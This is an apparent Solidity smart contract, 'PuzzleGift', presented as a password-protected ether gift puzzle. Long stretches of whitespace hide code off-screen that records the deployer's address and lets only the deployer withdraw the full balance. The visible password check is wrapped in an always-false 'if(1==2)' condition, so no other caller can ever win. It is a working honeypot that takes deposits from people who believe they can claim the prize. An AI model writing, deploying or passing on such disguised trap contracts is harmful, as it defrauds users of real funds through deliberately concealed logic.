
//Address: 0x55bec5649fbb5f5be831ee5b0f7a8a8f02b25144
//Contract name: PuzzleGift
//Balance: 0 Ether
//Verification Date: 2/1/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.18;

contract PuzzleGift
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            address prop = msg.sender;
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
    }
}
